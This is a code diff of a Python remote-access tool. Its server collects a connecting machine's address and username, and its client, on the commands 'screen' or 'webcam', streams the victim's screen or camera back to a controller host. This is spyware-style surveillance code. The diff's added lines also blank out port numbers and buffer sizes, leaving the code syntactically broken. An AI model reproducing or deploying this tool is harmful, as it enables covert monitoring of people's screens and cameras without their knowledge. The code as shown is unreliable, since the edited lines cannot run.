@@ -5,18 +5,18 @@ import socket
 import os
 
 local_ip_address = socket.gethostbyname(socket.gethostname())
-socket_port = 9977
+socket_port = 
 
 s = socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((local_ip_address, socket_port))
-s.listen(9)
+s.listen()
 
 client, addr = s.accept()
-network_name = client.recv(1024).decode("utf-8")
+network_name = client.recv().decode("utf-8")
 
 print(f"[+] {addr[0]} ({addr[1]}) | {network_name}")
 
-server = StreamingServer(local_ip_address, 6666)
+server = StreamingServer(local_ip_address, )
 server.start_server()
 
 print("[~] Server started")
@@ -38,7 +38,7 @@ import socket
 import getpass
 
 host = ""
-socket_port = 9977
+socket_port = 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host, socket_port))
@@ -46,11 +46,11 @@ s.connect((host, socket_port))
 s.send(str(getpass.getuser()).encode("utf-8"))
 
 while True:
-    cmd_data = s.recv(1024).decode("utf-8")
+    cmd_data = s.recv().decode("utf-8")
 
     if cmd_data == "screen":
-        screen = ScreenShareClient(host, 6666)
+        screen = ScreenShareClient(host, )
         screen.start_stream()
     elif cmd_data == "webcam":
-        camera = CameraClient(host, 6666)
+        camera = CameraClient(host, )
         camera.start_stream()
